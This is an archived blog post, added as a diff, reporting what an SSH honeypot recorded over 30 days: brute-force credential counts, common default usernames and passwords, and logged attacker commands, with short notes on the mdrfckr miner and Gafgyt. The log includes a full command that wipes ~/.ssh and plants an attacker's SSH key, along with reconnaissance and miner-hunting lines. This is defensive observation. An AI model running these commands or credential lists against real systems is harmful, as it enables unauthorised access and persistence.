@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>What You Get After Running an SSH Honeypot for 30 Days</title>
+  <style>
+    body { max-width: 800px; margin: 40px auto; padding: 0 20px; font-family: Georgia, serif; line-height: 1.6; }
+    .metadata { background: #f5f5f5; padding: 20px; margin-bottom: 30px; border-left: 4px solid #333; }
+    .metadata h1 { margin: 0 0 10px 0; font-size: 24px; }
+    .metadata p { margin: 5px 0; color: #666; }
+    .metadata a { color: #0066cc; text-decoration: none; }
+    .metadata a:hover { text-decoration: underline; }
+    .content { margin-top: 30px; }
+  </style>
+</head>
+<body>
+  <div class="metadata">
+    <h1>What You Get After Running an SSH Honeypot for 30 Days</h1>
+    <p><strong>URL:</strong> <a href="https://blog.sofiane.cc/ssh_honeypot">https://blog.sofiane.cc/ssh_honeypot</a></p>
+    <p><strong>Tags:</strong> devops, linux, malware</p>
+    <p><strong>Bookmark ID:</strong> 876797890</p>
+  </div>
+  <div class="content">
+<div id="readability-page-1" class="page"><div itemprop="articleBody">
+    <p><img src="data:application/octet-stream;base64,"></p>
+<h2 id="What-is-a-honeypot"><a href="#What-is-a-honeypot" title="What is a honeypot?"></a>What is a honeypot?</h2><p>A honeypot detects and records attacks when an attacker tries to break into a system. </p>
+<p>The honeypot we will discuss here is an SSH honeypot.</p>
+<h2 id="Environment"><a href="#Environment" title="Environment"></a>Environment</h2><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span><span>OS</span>: Ubuntu <span>24</span>.<span>04</span> LTS x<span>86</span>_<span>64</span> </span><br><span><span>Kernel</span>: <span>6</span>.<span>8</span>.<span>0</span>-<span>31</span>-generic</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="Login-Attempts"><a href="#Login-Attempts" title="Login Attempts"></a>Login Attempts</h2><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br></pre></td><td><pre><span><span>cat</span> <span>X</span>.<span>log</span> | <span>grep</span> -<span>c</span> <span>"login attempt"</span></span><br><span><span>11599</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>There were a total of 11,599 login attempts. Divided by 30 days, this means an average of 386 login attempts per day. </p>
+<h2 id="Used-Usernames"><a href="#Used-Usernames" title="Used Usernames"></a>Used Usernames</h2><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></pre></td><td><pre><span>cat X.log | grep -a <span>"login attempt"</span> | awk <span>'{print $5}'</span> | awk -F <span>"'"</span> <span>'{print $2}'</span> | sort | uniq -c | sort -nr | head</span><br><span>   8181 root</span><br><span>    977 345gs5662d34</span><br><span>    359 admin</span><br><span>    198 pi</span><br><span>    105 0</span><br><span>     71 ubuntu</span><br><span>     51 ubnt</span><br><span>     46 support</span><br><span>     37 user</span><br><span>     30 oracle</span><br></pre></td></tr></tbody></table></figure>
+<p>As expected, there are many attacks that target customary and default usernames.</p>
+<p>For the <code>345gs5662d34</code> user, according to the <strong>Aalborg University of Denmark Research</strong> this could be the default credential for a <strong>Polycom CX600 IP telephone</strong></p>
+<p>Check it here :<br><a target="_blank" rel="noopener" href="https://vbn.aau.dk/ws/portalfiles/portal/573748244/sweetcam_honeypot_paper_1_.pdf">SweetCam: an IP Camera Honeypot</a></p>
+<h3 id="Passwords"><a href="#Passwords" title="Passwords"></a>Passwords</h3><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></pre></td><td><pre><span><span>cat</span> X.log | grep -a <span>"login attempt"</span> | awk '{print $<span>5</span>}' | awk -F <span>"'"</span> '{print $<span>4</span>}' | sort | uniq -c | sort -nr | head</span><br><span>    <span>977</span> <span>345</span>gs<span>5662</span>d<span>34</span></span><br><span>    <span>967</span> <span>3245</span>gs<span>5662</span>d<span>34</span></span><br><span>    <span>246</span> admin</span><br><span>    <span>239</span> <span>123456</span></span><br><span>    <span>208</span> password</span><br><span>    <span>155</span> <span>0</span></span><br><span>     <span>88</span> root</span><br><span>     <span>75</span> raspberry</span><br><span>     <span>73</span> <span>123</span></span><br><span>     <span>66</span> raspberryraspberry<span>993311</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Once again, the same as the default username for <strong>Polycom CX600 IP telephone</strong></p>
+<h3 id="Commands-executed-after-login"><a href="#Commands-executed-after-login" title="Commands executed after login"></a>Commands executed after login</h3><figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></pre></td><td><pre><span>cat X.log | grep -a <span>"CMD"</span> | awk -F<span>'CMD: '</span> <span>'{print $2}'</span> | sort | uniq -c | sort -nr</span><br><span>   <span>6775</span> echo -e <span>"\x6F\x6B"</span></span><br><span>   <span>1016</span> cd ~; chattr -ia .ssh; lockr -ia .ssh</span><br><span>   <span>1016</span> cd ~ &amp;&amp; rm -rf .ssh &amp;&amp; mkdir .ssh &amp;&amp; echo <span>"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"</span>&gt;&gt;.ssh<span>/authorized_keys &amp;&amp; chmod -R go= ~/</span>.ssh &amp;&amp; cd ~</span><br><span>    <span>320</span> uname -s -v -n -r -m</span><br><span>    <span>112</span> .<span>/oinasf; dd if=/</span>proc<span>/self/</span>exe bs=<span>22</span> count=<span>1</span> || <span>while</span> read i; <span>do</span> echo <span>$i</span>; done &lt; <span>/proc/</span>self<span>/exe || cat /</span>proc<span>/self/</span>exe;</span><br><span>     <span>87</span> uname -a</span><br><span>     <span>29</span> ps | grep <span>'[Mm]iner'</span></span><br><span>     <span>29</span> ps -ef | grep <span>'[Mm]iner'</span></span><br><span>     <span>29</span> ls -la <span>/dev/</span>ttyGSM* <span>/dev/</span>ttyUSB-mod* <span>/var/</span>spool<span>/sms/</span>* <span>/var/</span>log<span>/smsd.log /</span>etc<span>/smsd.conf* /u</span>sr<span>/bin/</span>qmuxd <span>/var/</span>qmux_connect_socket <span>/etc/</span>config<span>/simman /</span>dev<span>/modem* /</span>var<span>/config/</span>sms/*</span><br><span>     <span>29</span> ifconfig</span><br><span>     <span>29</span> echo Hi | cat -n</span><br><span>     <span>29</span> cat <span>/proc/</span>cpuinfo</span><br><span>     <span>29</span> /ip cloud print</span><br><span>     <span>23</span> whoami</span><br><span>     <span>23</span> which ls</span><br><span>     <span>23</span> w</span><br><span>     <span>23</span> uname -m</span><br><span>     <span>23</span> uname</span><br><span>     <span>23</span> top</span><br><span>     <span>23</span> lscpu | grep Model</span><br><span>     <span>23</span> ls -lh $(which ls)</span><br><span>     <span>23</span> free -m | grep Mem | awk <span>'{print $2 ,$3, $4, $5, $6, $7}'</span></span><br><span>     <span>23</span> df -h | head -n <span>2</span> | awk <span>'FNR == 2 {print $2;}'</span></span><br><span>     <span>23</span> crontab -l</span><br><span>     <span>23</span> cat <span>/proc/</span>cpuinfo | grep name | wc -l</span><br><span>     <span>23</span> cat <span>/proc/</span>cpuinfo | grep name | head -n <span>1</span> | awk <span>'{print $4,$5,$6,$7,$8,$9;}'</span></span><br><span>     <span>23</span> cat <span>/proc/</span>cpuinfo | grep model | grep name | wc -l</span><br><span>     ・・・</span><br></pre></td></tr></tbody></table></figure>
+<p>Now the interesting part starts </p>
+<h3 id="The-oinasf-script"><a href="#The-oinasf-script" title="The oinasf script"></a>The oinasf script</h3><p><img src="data:application/octet-stream;base64,"></p>
+<p>The execution of a mysterious script, <code>./oinasf</code>, followed by attempts to read and display the system’s executable content, indicates a probing strategy for vulnerabilities or valuable information. </p>
+<p>The use of <code>/ip cloud print</code> suggests that bots target MikroTik routers to access or disrupt cloud-based services, while <code>uname -s -m</code> provides them with essential details about the operating system and machine architecture, valuable for crafting further actions tailored to the system’s specifics. </p>
+<p>In conclusion, these commands represent a clear strategy to infiltrate, assess, and establish control over targeted systems. </p>
+<p>They emphasize the bot’s preference for direct manipulation and sustained access highlighting the critical need for robust defenses against such common yet potentially devastating tactics.</p>
+<h3 id="The-mdrfckr-crypto-miner"><a href="#The-mdrfckr-crypto-miner" title="The mdrfckr crypto miner"></a>The mdrfckr crypto miner</h3><p><img src="data:application/octet-stream;base64,"></p>
+<p>This miner would simply create a cron job that would delete everything on  the <code>.ssh</code> folder and add a single ssh key and lock other users out. </p>
+<p>After that it would kill other miners if they exist and just have the open field.</p>
+<p>You can check this repo of someone who already got hacked and the miner was used on his server : <a target="_blank" rel="noopener" href="https://github.com/dangoldin/crypto-miner-hack/">Dump of the crypto-miner that got installed on my system - Github</a></p>
+<h3 id="The-MIPS-malware"><a href="#The-MIPS-malware" title="The MIPS malware"></a>The MIPS malware</h3><p><img src="data:application/octet-stream;base64,"></p>
+<p>Probably another <strong>MIPS</strong> (Multiprocessor without Interlocked Pipeline Stages) architecture malware, targeting routers and IoT devices.</p>
+<p>Here is a good read and analysis of the behaviour of a MIPS Malware :<br><a target="_blank" rel="noopener" href="https://www.giac.org/paper/grem/2573/analyzing-backdoor-bot-mips-platform/124977">Analyzing a Backdoor/Bot for the MIPS Platform</a></p>
+<h3 id="The-Sakura-sh-Script"><a href="#The-Sakura-sh-Script" title="The Sakura.sh Script"></a>The Sakura.sh Script</h3><p><img src="data:application/octet-stream;base64,"></p>
+<p>This script is part of the <strong>Gafgyt Malware</strong>. </p>
+<p><strong>Gafgyt</strong>, also known as <strong>BASHLITE</strong>, is a botnet affecting Internet of Things (IoT) devices and Linux-based systems. The malware aims to compromise and gain control of these devices, often by exploiting weak or default passwords, as well as known vulnerabilities. Gafgyt has been around since 2014 and has evolved into multiple variants, each with its own set of features and capabilities, including the ability to launch distributed denial of service (DDoS) attacks.</p>
+<p>Here is <a target="_blank" rel="noopener" href="https://securityscorecard.com/wp-content/uploads/2024/01/Report-A-Detailed-Analysis-Of-The-Gafgyt-Malware-Targeting-IoT-Devices.pdf">A Detailed Analysis of the Gafgyt Malware Targeting IoT Devices </a></p>
+<p>© 2024 — Sofiane Hamlaooui — Making the world a better place 🌎</p>
+<h2 id="🔗-Connect-with-me"><a href="#%F0%9F%94%97-Connect-with-me" title="🔗 Connect with me"></a>🔗 Connect with me</h2><p> 
+<a target="_blank" rel="noopener" href="https://twitter.com/S0fianeHamlaoui"><img height="30" width="30" src="data:application/octet-stream;base64,"></a><a href="https://blog.sofiane.cc/cdn-cgi/l/email-protection#dbb8b4b5afbab8af9ba8b4bdb2bab5bef5b8b8"><img height="30" width="30" src="data:application/octet-stream;base64,"></a>
+
+  </p></div></div>
+  </div>
+</body>
+</html>
